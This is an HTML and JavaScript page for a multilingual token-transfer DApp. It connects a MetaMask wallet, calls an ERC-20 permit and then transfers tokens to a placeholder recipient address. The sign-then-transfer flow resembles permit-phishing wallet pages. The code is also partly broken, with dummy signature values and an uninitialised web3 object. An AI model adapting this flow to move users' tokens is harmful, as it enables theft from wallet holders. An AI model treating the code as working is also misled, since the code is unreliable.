<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Transfer DApp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f9f9f9;
        }
        button {
            padding: 10px 15px;
            margin: 10px 0;
            border: none;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
        button:disabled {
            background-color: #ccc;
        }
    </style>
</head>
<body>
    <h1 id="title">代币转移 DApp</h1>
    <button id="connectButton">连接钱包</button>
    <button id="signButton" disabled>签名授权</button>
    <button id="transferButton" disabled>转移代币</button>

    <script>
        const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3";
        const abi = [
            {
                "inputs": [{"internalType": "address","name": "account","type": "address"}],
                "name": "balanceOf",
                "outputs": [{"internalType": "uint256","name": "","type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"internalType": "address","name": "owner","type": "address"},
                    {"internalType": "address","name": "spender","type": "address"},
                    {"internalType": "uint256","name": "value","type": "uint256"},
                    {"internalType": "uint256","name": "deadline","type": "uint256"},
                    {"internalType": "uint8","name": "v","type": "uint8"},
                    {"internalType": "bytes32","name": "r","type": "bytes32"},
                    {"internalType": "bytes32","name": "s","type": "bytes32"}
                ],
                "name": "permit",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"internalType": "address","name": "sender","type": "address"},
                    {"internalType": "address","name": "recipient","type": "address"},
                    {"internalType": "uint256","name": "amount","type": "uint256"}
                ],
                "name": "transferFrom",
                "outputs": [{"internalType": "bool","name": "","type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        const messages = {
            "zh": {
                "connect": "连接钱包",
                "sign": "签名授权",
                "transfer": "转移代币",
                "notConnected": "未连接钱包，请检查浏览器扩展或重试。",
                "signFailed": "签名失败，请重试。"
            },
            "en": {
                "connect": "Connect Wallet",
                "sign": "Sign Permit",
                "transfer": "Transfer Tokens",
                "notConnected": "Not connected. Please check your browser extension and try again.",
                "signFailed": "Sign failed. Please try again."
            },
            "kr": {
                "connect": "지갑 연결",
                "sign": "서명 허가",
                "transfer": "토큰 전송",
                "notConnected": "연결되지 않았습니다. 브라우저 확장을 확인하고 다시 시도하십시오.",
                "signFailed": "서명 실패. 다시 시도하십시오."
            },
            "jp": {
                "connect": "ウォレット接続",
                "sign": "サイン許可",
                "transfer": "トークン転送",
                "notConnected": "接続されていません。ブラウザ拡張機能を確認し、再試行してください。",
                "signFailed": "サインに失敗しました。再試行してください。"
            }
        };

        let currentLanguage = "zh"; // 默认语言

        document.getElementById("connectButton").onclick = async () => {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    document.getElementById("signButton").disabled = false;
                } catch (error) {
                    alert(messages[currentLanguage].notConnected);
                }
            } else {
                alert("请安装 MetaMask！");
            }
        };

        document.getElementById("signButton").onclick = async () => {
            const accounts = await ethereum.request({ method: 'eth_accounts' });
            const account = accounts[0];
            const deadline = Math.floor(Date.now() / 1000) + 60 * 60; // 1小时后过期
            const v = 0; // 示例值
            const r = '0x'; // 示例值
            const s = '0x'; // 示例值

            try {
                const contract = new window.web3.eth.Contract(abi, contractAddress);
                await contract.methods.permit(account, account, 1000, deadline, v, r, s).send({ from: account });
                document.getElementById("transferButton").disabled = false;
            } catch (error) {
                alert(messages[currentLanguage].signFailed);
            }
        };

        document.getElementById("transferButton").onclick = async () => {
            const accounts = await ethereum.request({ method: 'eth_accounts' });
            const account = accounts[0];
            const recipient = "0xYourRecipientAddress"; // 替换为收款地址
            const amount = 100; // 转移数量

            const contract = new window.web3.eth.Contract(abi, contractAddress);
            await contract.methods.transferFrom(account, recipient, amount).send({ from: account });
            alert("代币转移成功！");
        };
    </script>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</body>
</html>
